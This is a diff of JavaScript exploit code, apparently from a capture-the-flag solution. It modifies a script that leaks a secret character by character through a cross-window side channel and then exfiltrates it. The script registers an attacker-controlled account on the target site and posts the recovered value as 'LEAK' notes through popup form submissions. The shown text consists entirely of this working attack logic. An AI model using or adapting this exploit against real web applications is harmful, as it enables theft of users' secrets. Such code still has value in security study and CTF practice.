@@ -76,7 +76,7 @@ window.addEventListener("storage", (event) => {
 });
 
 async function waitForHit() {
-  for (let i = 0; i < 50; i++) {
+  for (let i = 0; i < 100; i++) {
     if (currentHit) {
       return currentHit;
     }
@@ -84,7 +84,7 @@ async function waitForHit() {
       const data = JSON.parse(localStorage.getItem("findit-hit") || "null");
       receiveHit(data);
     } catch (_) {}
-    await sleep(100);
+    await sleep(150);
   }
   return null;
 }
@@ -125,12 +125,13 @@ async function runRound() {
 
   if (!hit) {
     log("no hit after " + prefix);
+    await storeNote("FAIL no hit after " + prefix + " round=" + round);
     return;
   }
 
   prefix += hit.ch;
   if (hit.ch === "}") {
-    await storeFlag(prefix);
+    await storeNote("LEAK " + prefix);
     return;
   }
 
@@ -138,8 +139,8 @@ async function runRound() {
   runRound();
 }
 
-async function storeFlag(flag) {
-  log("flag=" + flag);
+async function storeNote(content) {
+  log("store=" + content);
   popupPost("final_register", "/register", {
     username: LEAK_USER,
     password: LEAK_PASS
@@ -153,12 +154,12 @@ async function storeFlag(flag) {
   await sleep(1200);
 
   popupPost("final_note_1", "/create-note", {
-    content: "LEAK " + flag
+    content
   });
   await sleep(800);
 
   popupPost("final_note_2", "/create-note", {
-    content: "LEAK " + flag
+    content
   });
   log("stored in " + LEAK_USER);
 }
